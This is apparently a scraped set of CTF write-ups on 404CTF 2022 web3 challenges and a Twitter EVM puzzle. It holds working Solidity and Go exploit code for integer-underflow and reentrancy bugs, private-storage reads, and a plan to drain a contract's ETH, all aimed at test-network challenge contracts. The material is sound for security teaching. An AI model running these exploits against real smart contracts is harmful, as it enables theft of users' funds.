portal. Break into their system and retrieve any sensitive information you can find. Contract at: 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6 Ropsten test network Author: Soremo nc challenge.404ctf.fr 30885 The source code of the smart contract is given: pragma solidity 0.7.6; contract FreeMoney { mapping (address =\u003e uint256) balances; mapping(address =\u003e uint256) lastWithdrawTime; mapping(address =\u003e bool) isHallebardeMember; address private boss; constructor() public { boss = msg.sender; } function getMoney(uint256 numTokens) public { require(numTokens \u003c 10000); require(block.timestamp \u003e= lastWithdrawTime[msg.sender] + 365 days, \"Vous devez attendre un an entre chaque demande d'argent.\"); balances[msg.sender] += numTokens; lastWithdrawTime[msg.sender] = block.timestamp; } function reset() public { balances[msg.sender] = 0; lastWithdrawTime[msg.sender] = 0; } function transfer(address receiver, uint256 numTokens) public returns (bool) { require(balances[msg.sender] \u003e 0); balances[msg.sender] -= numTokens; balances[receiver] += numTokens; return true; } function enterHallebarde() public { require(balances[msg.sender] \u003e 100 ether || boss == msg.sender, \"Vous n'avez pas assez d'argent pour devenir membre de Hallebarde.\"); require(msg.sender != tx.origin || boss == msg.sender, \"Soyez plus entreprenant !\"); require(!isHallebardeMember[msg.sender]); isHallebardeMember[msg.sender] = true; } function getMembershipStatus(address memberAddress) external view returns (bool) { require(msg.sender == memberAddress || msg.sender == boss); return isHallebardeMember[memberAddress]; } } ","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar1/:1:0","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 1 (web3)","uri":"/posts/writeup-404ctf-22/contractswar1/"},{"categories":["Web3"],"content":"Exploitation The goal of the challenge is to execute the enterHallebarde() function without having the transaction being reverted and connect to challenge.404ctf.fr on port 30885 to give our address to get the flag. There are two checks to pass in the enterHallebarde() function to succeed: The sender’s balance must be greater than 100 ether or the sender is the owner of the contract. The sender must be different from the origin of the transaction or the sender must be the owner of the contract. ","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar1/:2:0","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 1 (web3)","uri":"/posts/writeup-404ctf-22/contractswar1/"},{"categories":["Web3"],"content":"First condition There are two functions that can increase the balance: getMoney() and transfer(). With getMoney() you can get only 10000 wei which corresponds to 0.00000000000001 ether (check with a converter online). This function can be called only once a year. The transfer() function can be called to transfer money from the sender to another address. A first check is made to ensure that the sender has more than 0 ether. Then the sender’s balance is decreased by the amount of money to be transferred. The recipient’s balance is increased by the amount of money to be transferred. However, the balance is not compared to the number of tokens to be transferred. In the situation where the sender have 1 wei and wants to transfer 2 wei to a random address, what will happen to our uint256 variable? This is an integer underflow vulnerability. Our balance will be egal to the maximum value of an uint256 which is about 1.15e+59 ether. Let’s do it! The environment has to be configured, the solc binary (version 0.7.6 to match the contract requirements) and abigen are needed. mkdir -p /tmp/challenge/FreeMoney cd $_ go mod init challenge cp /tmp/FreeMoney.sol /tmp/challenge/FreeMoney/ solc --abi FreeMoney.sol -o . abigen --abi=./FreeMoney.abi --pkg=freemoney --out=FreeMoney.go An optional but recommended step is to work on a fork of the blockchain for faster performance and easier debugging. npx hardhat node --fork https://ropsten.infura.io/v3/\u003cAPIKEY\u003e #or anvil --fork-url https://ropsten.infura.io/v3/\u003cAPIKEY\u003e And ctf-freemoney.go package main import ( \"context\" \"crypto/ecdsa\" freemoney \"challenge/FreeMoney\" \"flag\" \"log\" \"math/big\" \"github.com/ethereum/go-ethereum/accounts/abi/bind\" \"github.com/ethereum/go-ethereum/common\" \"github.com/ethereum/go-ethereum/crypto\" \"github.com/ethereum/go-ethereum/ethclient\" ) var fork bool func main() { var blockchainURL, contractAddress, privateKey string _ = privateKey flag.BoolVar(\u0026fork, \"fork\", true, \"Should we use the parameter for the fork blockchain ? (default: true)\") flag.Parse() contractAddress = \"0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6\" if fork { blockchainURL = \"http://127.0.0.1:8545\" privateKey = \"59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d\" } else { blockchainURL = \"https://eth-rinkeby.alchemyapi.io/v2/\u003cAPI-KEY\u003e\" privateKey = \"\u003cPRIVATE-KEY\u003e\" } // Connect to an ethereum node client, err := ethclient.Dial(blockchainURL) if err != nil { log.Fatal(err) } // Contract contractAddressHash := common.HexToAddress(contractAddress) instance, err := freemoney.NewFreemoney(contractAddressHash, client) // Get 1 wei // GetMoney is a write transaction and therefore need to be signed auth := newTransactor(client, privateKey) _, err = instance.GetMoney(auth, big.NewInt(1)) if err != nil { log.Fatal(\"fail to get money \", err) } // Transfer 2 wei to a random address // Transfer is a write transaction and therefore need to be signed auth = newTransactor(client, privateKey) _, err = instance.Transfer(auth, common.HexToAddress(\"0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266\"), big.NewInt(2)) if err != nil { log.Fatal(\"fail to get transfer \", err) } // EnterHallebarde // EnterHallebarde is a write transaction and therefore need to be signed auth = newTransactor(client, privateKey) _, err = instance.EnterHallebarde(auth) if err != nil { log.Fatal(\"fail to enterHallebarde\", err) } } // newTransactor creates a transaction signer based on the provided private key func newTransactor(client *ethclient.Client, privateKeyStr string) *bind.TransactOpts { privateKey, err := crypto.HexToECDSA(privateKeyStr) if err != nil { log.Fatal(err) } publicKey := privateKey.Public() publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey) if !ok { log.Fatal(\"cannot assert type: publicKey is not of type *ecdsa.PublicKey\") } fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA) nonce, err := client.PendingNonceAt(context.Background(), fromAddress) if err != nil { log.Fatal(err) } gasPrice, err := client.SuggestGasPrice(context.","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar1/:2:1","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 1 (web3)","uri":"/posts/writeup-404ctf-22/contractswar1/"},{"categories":["Web3"],"content":"Second condition To bypass this check, we need to understand tx.origin and msg.sender. According to the ethereum whitepaper: In general, there are two types of accounts: externally owned accounts, controlled by private keys, and contract accounts, controlled by their contract code. tx.origin is the address of the externally owned accounts (or a wallet) that sent the transaction. msg.sender is the address of the account from which the call originated. It can be either an externally owned account or a contract account. By analogy with network address, tx.origin is like an IP address and msg.sender is like an arp address. Thus, the condition msg.sender != tx.origin means that the transaction must come from a contract account. Basically, we have to do the previous part written in Golang in Solidity. :smile:. // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Test.sol\"; // The interface defining the function in the vulnerable contract that we want to call interface IFREE_MONEY { function enterHallebarde() external; function transfer(address receiver, uint256 numTokens) external; function getMoney(uint256 numTokens) external; function getMembershipStatus(address memberAddress) external returns (bool); } contract ContractTest is Test { // The target contract address public constant FREE_MONEY_CONTRACT = 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6; // setUp is a foundry function that is not needed here function setUp() public {} function freeMoneyPwn() public { IFREE_MONEY fm = IFREE_MONEY(FREE_MONEY_CONTRACT); // Call getMoney with 1 wei fm.getMoney(1); // Transfer 2 wei to a random address to trigger the underflow vulnerability fm.transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 2); // EnterHallebarde fm.enterHallebarde(); // Check if we are a member, otherwise revert require(fm.getMembershipStatus(address(this)), \"Not in membership\"); } } I use Foundry introduce in the post Setting up the environment. The above code can be tested on the fork with the command forge: forge run test/FreeMoney.t.sol --fork-url http://127.0.0.1:8545 --sig \"freeMoneyPwn()\" -vvvv No errors are returned. We can now deploy it on ropsten. forge create --rpc-url https://ropsten.infura.io/v3/\u003cAPI KEY\u003e --private-key \u003cPRIVATE KEY\u003e test/FreeMoney.t.sol:ContractTest [⠘] Compiling... [⠃] Compiling 2 files with 0.8.13 [⠢] Compiling 2 files with 0.6.12 [⠑] Solc 0.6.12 finished in 155.95ms [⠊] Solc 0.8.13 finished in 2.56s Compiler run successful Deployer: 0xbafe3de2e4fbd28ce3d71db73b429cf13359f9e8 Deployed to: 0xbd5a2d122e606ba8e291db4da69fe879fed767e6 Transaction hash: 0xaf1231b3a5144264ac530f5409a5c68ce624c925792469ac29ee027893a66bcf And we can call the freeMoneyPwn() function: cast send 0xbd5a2d122e606ba8e291db4da69fe879fed767e6 \"freeMoneyPwn()\" --rpc-url https://ropsten.infura.io/v3/\u003cAPI KEY\u003e --private-key \u003cPRIVATE KEY\u003e blockHash 0xfed145a41b6b0980fac1c04792951c68b800efcbb837eae7365fc8d87ee37a67 blockNumber 12281762 contractAddress cumulativeGasUsed 833921 effectiveGasPrice 3000130589 gasUsed 116832 logs [] logsBloom 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 root status 1 transactionHash 0x3f26d603dc17454bd0fa0eb47c120b0e402c526ab1cda862694b53ea53f797ba transactionIndex 6 type 2 We can use the contract address to validate the challenge: nc challenge.404ctf.fr 30885 Si vous êtes un membre, appuyez sur entrée. Si vous êtes un VIP, rentrez votre pass : Nous allons maintenant vérifier que vous êtes bien un membre. Veuillez rentrer l'adresse ethereum avec laquelle vous ê","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar1/:2:2","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 1 (web3)","uri":"/posts/writeup-404ctf-22/contractswar1/"},{"categories":["Web3"],"content":"Recommendation To avoid such vulnerabilities, the safeMath library or the 0.8 branch of the solidity compiler should be used and the transfer() function should implement the appropriate require function. ","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar1/:3:0","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 1 (web3)","uri":"/posts/writeup-404ctf-22/contractswar1/"},{"categories":["web3"],"content":"Writeup of web3 challenge of 404CTF 2022 - contracts war 2/2","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar2/","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 2 (web3)","uri":"/posts/writeup-404ctf-22/contractswar2/"},{"categories":["web3"],"content":"Statement The challenge statement is as follows: Agent, now that you have a little more web3 expertise, we would like to call upon your skills in a more delicate situation. We have detected traces of suspicious activity at the address 0xD5c0873f147cECF336fEEF1a28474716C745Df86. Hallebarde is apparently trying to create its own cryptocurrency. Also, it seems that the oldest members of Hedgehog can get some kind of VIP pass. Use this pass to get information only known by the elite of Halberd. Contract at: 0xD5c0873f147cECF336fEEF1a28474716C745Df86 Ropsten test network Author: Soremo nc challenge.404ctf.fr 30885 The source code of the smart contract is given: pragma solidity 0.8.13; // solidity \u003e 0.8.0 is using SafeMath by default. No integer underflow or overflow. interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function allowance(address owner, address spender) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); } contract HallebardeToken is IERC20 { using SafeMath for uint256; string public constant name = \"Hallebarde\"; string public constant symbol = \"HLB\"; uint8 public constant decimals = 18; mapping(address =\u003e uint256) balances; mapping(address =\u003e mapping (address =\u003e uint256)) allowed; mapping(address =\u003e uint256) seniority; mapping(address =\u003e uint256) lastWithdrawTime; uint256 private vipPass; address private boss; uint256 totalSupply_; constructor(string memory _password) public { totalSupply_ = 1000000 ether; balances[msg.sender] = 1000 ether; balances[address(this)] = 999000 ether; seniority[msg.sender] = 10*365 days; boss = msg.sender; rand(_password); } function rand(string memory _password) public onlyOwner { vipPass = uint(keccak256(abi.encodePacked( msg.sender, block.timestamp, block.difficulty, vipPass, balances[address(this)], _password))); } function totalSupply() public override view returns (uint256) { return totalSupply_; } function balanceOf(address tokenOwner) public override view returns (uint256) { return balances[tokenOwner]; } function seniorityOf(address tokenOwner) public view returns (uint256) { return seniority[tokenOwner]; } // buyHLB to get HLB token. function buyHLB() public payable { require(msg.value \u003e 0, \"Vous avez besoin d'ethereum pour acheter des HLB.\"); require(balances[address(this)] \u003e= msg.value, \"Il n'y a plus assez de HLB disponible. Revenez plus tard.\"); balances[msg.sender] = balances[msg.sender].add(msg.value); balances[address(this)] = balances[address(this)].sub(msg.value); } // sellHLB to sell HLB token. We can sell token once per year. function sellHLB(uint256 numTokens) public { // Check if we have enough token to sell require(balances[msg.sender] \u003e= numTokens); // Check the last time we sold HLB require(block.timestamp \u003e= lastWithdrawTime[msg.sender] + 365 days, \"Vous devez attendre un an entre chaque retrait.\"); // Call the function transfer below to update the balance of the receiver and the sender. transfer(address(this), numTokens); // Update the seniroty of the user. The seniority is used to get the vip pass. seniority[msg.sender] = seniority[msg.sender].add(365 days); // Send ether to the remote address. The fallback function is used to send ether to the contract. (bool sent, ) = msg.sender.call{value: numTokens}(\"\"); require(sent, \"Erreur lors de l'envoi de l'ethereum.\"); // Update the last time we sold HLB. This is used to check if we can sell HLB again. lastWithdrawTime[msg.sender] = block.timestamp; } function transfer(address receiver, uint256 numTokens) public override returns (bool) { require(nu","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar2/:1:0","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 2 (web3)","uri":"/posts/writeup-404ctf-22/contractswar2/"},{"categories":["web3"],"content":"Exploitation ","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar2/:2:0","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 2 (web3)","uri":"/posts/writeup-404ctf-22/contractswar2/"},{"categories":["web3"],"content":"VipPass By seeing this contract, the goal was pretty clear. We want to get the vip pass. One thing that should never be forgotten in solidity: Nothing is private in smart contracts! The public variable can be accessed easly with call instruction. In other hand, the private variable can be accessed only with the function rpc function eth_getStorageAt (the name may be different depending of the client). The slot storage are explains in depth in soliditylang. Basically, compare to other types, uint256 is easy to understand. Its position slot is the position of the declared variable (note that the mapping does not count). In our case uint256 private vipPass; is at position 4, the variable boss (the owner of the contract) is at position 5. To access the variable vipPass, we will use cast from the foundry binaries: $ # cast storage \u003ccontract address\u003e \u003cslot number\u003e $ cast storage 0xD5c0873f147cECF336fEEF1a28474716C745Df86 4 0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080 The function senior() returns the vipPass as an uint256 value. The cast storage command returns the value as a hexadecimal string. We can either use an online converter or solidity (with foundry dependencies). // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Test.sol\"; contract ContractTest is Test { function convert() public { //address test = address(0x9A5a04eCC45BB46877ADcd1Fa4dB82C08D1bd080); //uint256 test2 = uint256(uint160(test)); uint256 test3 = 0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080; emit log_named_uint(\"test2: \", test3); } } This contract can be executed with the forge command: $ forge run test/Converter.t.sol --fork-url http://127.0.0.1:8545 --sig \"convert()\" [⠒] Compiling... [⠆] Compiling 6 files with 0.8.13 [⠰] Solc 0.8.13 finished in 2.05s Compiler run successful Script ran successfully. Gas used: 2108 == Return == == Logs == test2: : 38330739118242568697380065849010598905319469511070891991863930858741423657088 Unfortunately, the vipPass is not the only thing that is required, we need to have an address that is VIP: nc challenge.404ctf.fr 30885 Si vous êtes un membre, appuyez sur entrée. Si vous êtes un VIP, rentrez votre pass : 38330739118242568697380065849010598905319469511070891991863930858741423657088 Nous allons maintenant vérifier que vous êtes bien un vip. Veuillez rentrer l'adresse ethereum avec laquelle vous êtes vip : ","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar2/:2:1","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 2 (web3)","uri":"/posts/writeup-404ctf-22/contractswar2/"},{"categories":["web3"],"content":"Pwning the contract To get VIP we have to pass two requires: require(seniority[msg.sender] \u003e= 10 * 365 days, \"Revenez dans quelque temps.\"); and require(seniority[msg.sender] \u003c 150 * 365 days, \"Vous vous faites vieux, laissez-nous la place.\");. The only function that update the seniroity mapping is function sellHLB(uint256 numTokens). This function can only be called once a year and if we have already some HLB tokens. Before updating the lastWithdrawTime variable to restrict the call to that function, the fallback to our contract is called, which can call the sellHLB(uint256 numTokens) function. In other words, we can call the function sellHLB(uint256 numTokens) multiple times before the lastWithdrawTime function is updated, this is a reentrency attack! // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"ds-test/test.sol\"; import \"forge-std/Test.sol\"; interface IHallebardeToken { function sellHLB(uint256 numTokens) external; function seniorityOf(address tokenOwner) external view returns (uint256); function balanceOf(address tokenOwner) external returns (uint256); function buyHLB() external payable; function senior() external view returns (uint256); } contract TokenTest is Test { uint256 i = 0; IHallebardeToken ht = IHallebardeToken(address(0xD5c0873f147cECF336fEEF1a28474716C745Df86)); constructor() payable {} function pwn() public { ht.buyHLB{value: 12}(); ht.sellHLB(1); ht.senior(); } receive() external payable { emit log_named_uint( \"seniority\", ht.seniorityOf(address(this)) / 365 days ); if (i \u003c= 8) { i++; ht.sellHLB(1); } } } Running the above script with forge: forge run test/token.t.sol --fork-url http://127.0.0.1:8545 --sig \"pwn()\" -vvvv returns the following output: [⠒] Compiling... [⠢] Compiling 6 files with 0.8.13 [⠰] Solc 0.8.13 finished in 2.02s Compiler run successful Traces: [278997] TokenTest::pwn() ├─ [28455] 0xd5c0…df86::dbd6bdcb{value: 12}() │ └─ ← () ├─ [234688] 0xd5c0…df86::d16bb868(0000000000000000000000000000000000000000000000000000000000000001) │ ├─ emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef │ │ topic 1: 0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84 │ │ topic 2: 0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86 │ │ data: 0x0000000000000000000000000000000000000000000000000000000000000001 │ ├─ [198085] TokenTest::fallback{value: 1}() │ │ ├─ [908] 0xd5c0…df86::3b26d8d2(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) [staticcall] │ │ │ └─ ← 0x0000000000000000000000000000000000000000000000000000000001e13380 │ │ ├─ emit log_named_uint(key: \"seniority\", val: 1) │ │ ├─ [171914] 0xd5c0…df86::d16bb868(0000000000000000000000000000000000000000000000000000000000000001) │ │ │ ├─ emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef │ │ │ │ topic 1: 0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84 │ │ │ │ topic 2: 0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86 │ │ │ │ data: 0x0000000000000000000000000000000000000000000000000000000000000001 │ │ │ ├─ [159211] TokenTest::fallback{value: 1}() │ │ │ │ ├─ [908] 0xd5c0…df86::3b26d8d2(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) [staticcall] │ │ │ │ │ └─ ← 0x0000000000000000000000000000000000000000000000000000000003c26700 │ │ │ │ ├─ emit log_named_uint(key: \"seniority\", val: 2) │ │ │ │ ├─ [154940] 0xd5c0…df86::d16bb868(0000000000000000000000000000000000000000000000000000000000000001) │ │ │ │ │ ├─ emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef │ │ │ │ │ │ topic 1: 0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84 │ │ │ │ │ │ topic 2: 0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86 │ │ │ │ │ │ data: 0x0000000000000000000000000000000000000000000000000000000000000001 │ │ │ │ │ ├─ [142237] TokenTest::fallback{value: 1}() │ │ │ │ │ │ ├─ [908] 0xd5c0…df86::3b26d8d2(000000000000000000000000b4c79dab8f259c7aee6e5b2aa72982","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar2/:2:2","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 2 (web3)","uri":"/posts/writeup-404ctf-22/contractswar2/"},{"categories":["Web3"],"content":"Writeup of web3 challenge of 404CTF 2022 - the public key. The goal of the challenge was to retrieve the address in the storage and then find the public key of the address.","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/publickey/","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - public key (web3)","uri":"/posts/writeup-404ctf-22/publickey/"},{"categories":["Web3"],"content":"Statement The challenge statement is as follows: Agent, we have prepared an exercise to check your understanding of the blockchain, because the practical aspect is important but the theoretical part is just as important. Contract at the address: 0x9Eb8F52b22024003C1312ea1569cf14208f3c30A Ropsten test network Warning, this challenge uses a test blockchain (Ropsten network). Under NO circumstances should you use real cryptocurrencies for this challenge. We are not responsible for any loss you might suffer if you do so. If you have real cryptocurrencies, we strongly advise you to create a new wallet dedicated to these challenges. The source code of the smart contract is given: pragma solidity 0.8.13; contract publicKey{ address private secretAddress; constructor(address _secretAddress){ secretAddress = _secretAddress; } function isPublicKey(bytes memory mystery) external view returns(bool){ require(address(uint160(uint256(keccak256(mystery)))) == secretAddress, \"Essayez encore !\"); return true; } } ","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/publickey/:1:0","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - public key (web3)","uri":"/posts/writeup-404ctf-22/publickey/"},{"categories":["Web3"],"content":"Exploitation The source code is short and contains one variable and one function. Before explaining the source code when need to understand how the address, public key and private key work in Solidity. There are three steps to generate a new wallet: First, a private key is generated, it is composed of 64 hexadecimal characters (i.e fad9c8855b740a0b7ed4c221dbad0f33a83a49cad6b3fe8d5817ac83d38b6a19). Then, from the private key with the algorithm ECDSA, the public key is generated, it is composed of 128 hexadecimal characters (i.e 9a7df67f79246283fdc93af76d4f8cdd62c4886e8cd870944e817dd0b97934fdd7719d0810951e03418205868a5c1b40b192451367f28e0088dd75e15de40c05). Sometimes the public key can be compressed to save memory space (source) Finally, the wallet address is generated from the public key. In solidity, this can be done as follows address(uint160(uint256(keccak256(publickey)))). This code takes the keccak256 hash of the public key and converts it to a 160-bit number. This number is then converted to a 20-byte address. For example, the keccack256 of the previous public key is 793d56a696967d8f0833fd6296216849c49358b10257cb55b28ea603c874b05e (several tools online can get the keccack256 hash). The address is the last 40 characters (96216849c49358b10257cb55b28ea603c874b05e) By knowing all this, the isPublicKey function takes a public key as parameter, get the address from it and compare it with the secretAddress variable. The exploitation can be done in two steps. Retrieving the secretAddress variable In solidity contract nothing is really private. Even if the visibility of the variable has been set to private, the variable is still accessible. Web3 clients has a method called StorageAt (or something similar depending of the language) that can be used to retrieve a hex string at a specific slot in the contract. Beforehand, I forked the blockchain for faster performance and easier debugging. npx hardhat node --fork https://ropsten.infura.io/v3/\u003cAPIKEY\u003e #or anvil --fork-url https://ropsten.infura.io/v3/\u003cAPIKEY\u003e The storage can be retrieved with cast from foundry: cast storage 0x9Eb8F52b22024003C1312ea1569cf14208f3c30A 0 0x000000000000000000000000cf9a54585b20041ac1265ad64ce21d09fd4b1324 or in golang package main import ( \"context\" \"encoding/hex\" \"errors\" \"flag\" \"fmt\" \"log\" \"math/big\" \"github.com/ethereum/go-ethereum/common\" \"github.com/ethereum/go-ethereum/crypto\" \"github.com/ethereum/go-ethereum/ethclient\" ) var fork bool func main() { var blockchainURL, contractAddress string flag.BoolVar(\u0026fork, \"fork\", true, \"Should we use the parameter for the fork blockchain ? (default: true)\") flag.Parse() contractAddress = \"0x9Eb8F52b22024003C1312ea1569cf14208f3c30A\" if fork { blockchainURL = \"http://127.0.0.1:8545\" } else { blockchainURL = \"https://ropsten.infura.io/v3/\u003cAPIKEY\u003e\" } client, err := ethclient.Dial(blockchainURL) if err != nil { log.Fatal(err) } // Contract contractAddressHash := common.HexToAddress(contractAddress) storageContent, _ := client.StorageAt(context.Background(), contractAddressHash, common.BigToHash(big.NewInt(0)), nil) fmt.Println(\"secretAddress:\", common.Bytes2Hex(storageContent)) } which returns the same value. We know that the secretAddress is 0xcf9a54585b20041ac1265ad64ce21d09fd4b1324. An important thing about a transaction on the blockchain, is that each transaction is signed with the private key of the sender. The sender’s public key is also included in the signature. If the node is not able to verify the signature, it will not accept the transaction. At this point, if the address 0xcf9a54585b20041ac1265ad64ce21d09fd4b1324 has sent a transaction, we will be able to retrieve its public key. Lucky we are, it has sent four transactions (ropsten.etherscan.io). We need to recover the raw transaction that has been send by 0xcf9a54585b20041ac1265ad64ce21d09fd4b1324. For some unknown reason etherscan can’t retrieve the raw transaction. But we can do it with any language with a web3 module. ... // Get the raw transaction in","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/publickey/:2:0","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - public key (web3)","uri":"/posts/writeup-404ctf-22/publickey/"},{"categories":["Web3"],"content":"Puzzle, bytecode and selfdestruct!","date":"2022-12-30","objectID":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/","tags":["PoC","EVM","LOW-LEVEL","REVERSE ENGINEERING","SELFDESTRUCT"],"title":"Challenge Twitter - EVM Puzzles \u0026 selfdestruct","uri":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/"},{"categories":["Web3"],"content":"1. Introduction The 29 December 2022 a challenge went public on Twitter, it was the evening and what to do after a day of full of auditing solidity contract? Eat,Sleep,Audit,Repeat? Tweet from 0x796 to launch the challenge The goal of the challenge is to steal the 0.1 ETH that are waiting on the vulnerable contract. Let’s dive into the challenge.. Obviously, the contract is not verified so we have to dive into the bytecode time to use decompilers lads! Input Data from Etherscan Here, we have to go fast because the challenge is public so first come first serve… In addition, The contract size seems to be small. Let’s use dedaub this time (even if heimdall looks really promising). After using the debugger, we have the following code decompiled: function __function_selector__() public payable { v0 = BASEFEE(); if (msg.value) { require(msg.value \u003e 'iiiii' * (0x63b0beef - block.timestamp)RETURNDATASIZE(), RETURNDATASIZE()); STORAGE[msg.sender] = 4095 + block.timestamp; return MEM[(RETURNDATASIZE()) len (RETURNDATASIZE())]; } else { require((block.timestamp \u003e STORAGE[msg.sender]) \u0026 (RETURNDATASIZE() \u003c STORAGE[msg.sender])RETURNDATASIZE(), RETURNDATASIZE()); MEM[0] = (msg.data.length \u003c\u003c 232) + 0x61000080600a3d393df300000000000000000000000000000000000000000000; CALLDATACOPY(10, RETURNDATASIZE(), msg.data.length); v1 = v2 = 1 + (msg.data.length - 1 \u003e\u003e 5); do { MEM[10 + (v2 - v1 \u003c\u003c 5)] = (msg.sender | msg.sender \u003c\u003c 160) ^ MEM[10 + (v2 - v1 \u003c\u003c 5)]; v1 = v1 - 1; } while (!v1); v3 = create.code(RETURNDATASIZE(), msg.data.length + 10).value(RETURNDATASIZE()); [1] v4 = v3.delegatecall(MEM[(RETURNDATASIZE()) len (RETURNDATASIZE())], MEM[(RETURNDATASIZE()) len (RETURNDATASIZE())]).gas(msg.gas); return MEM[(RETURNDATASIZE()) len (RETURNDATASIZE())]; } } Steal the 0.1 eth without external calls? Inside the contract we don’t have any transfer(), or .call(). But, since we got a delegatecall() at the end of the code we probably need to call it. So we need to somehow find a way to trigger the delegatecall() on the address ➙ v3 with a EVM bytecode that permits to execute what we wants here will be to empty the contract!. If we are looking closely to the address v3, we can see that a contract is created and deployed from the the memory of the contract. v3 = create.code(RETURNDATASIZE(), msg.data.length + 10).value(RETURNDATASIZE()); Hmmm.. time to make put some malicious bytecode into this memory to create and deployed our malicious contract! So we probably need to figure out, how could we manage to deploy a malicious evm bytecode to steal the 0.1 ETH. Have to remember the famous 10M bounty from wormhole here ➙ Wormhole Uninitialized Proxy Bugfix Review) ","date":"2022-12-30","objectID":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/:0:1","tags":["PoC","EVM","LOW-LEVEL","REVERSE ENGINEERING","SELFDESTRUCT"],"title":"Challenge Twitter - EVM Puzzles \u0026 selfdestruct","uri":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/"},{"categories":["Web3"],"content":"2. Conditions bypass So for now we need to bypass the first require() . require((block.timestamp \u003e STORAGE[msg.sender]) \u0026 (RETURNDATASIZE() \u003c STORAGE[msg.sender])RETURNDATASIZE(), RETURNDATASIZE()); For this, we just need to have the storage[msg.sender] \u003e returndatasize() which will always be 0 in our case for the returndatasize() EVM gas optimization Here returndatasize() will return always 0 and will be cheaper in gas than a classic push 👀 evm.codes ReturnDataSize Then, we need to have to bypass the following check: block.timestamp \u003e STORAGE[msg.sender]) To do, so we need to find a way to write at STORAGE[msg.sender]. Hopefully for us, we have the following the code: if (msg.value) { require(msg.value \u003e 'iiiii' * (0x63b0beef - block.timestamp)RETURNDATASIZE(), RETURNDATASIZE()); STORAGE[msg.sender] = 4095 + block.timestamp; return MEM[(RETURNDATASIZE()) len (RETURNDATASIZE())]; } If the msg.value \u003e 0 is true then the contract will overwrite the value STORAGE[msg.sender] with the block.timestamp + 4095 So, here we know we will have to make two calls: Setup the value into the storage to bypass the require() using a msg.value \u003e 0. Then recall the contract with msg.value == 0 to execute the delegatecall(). However, if we are looking closely the : STORAGE_[msg.sender] = 4095 + block.timestamp; but the check later on, compares: block.timestamp 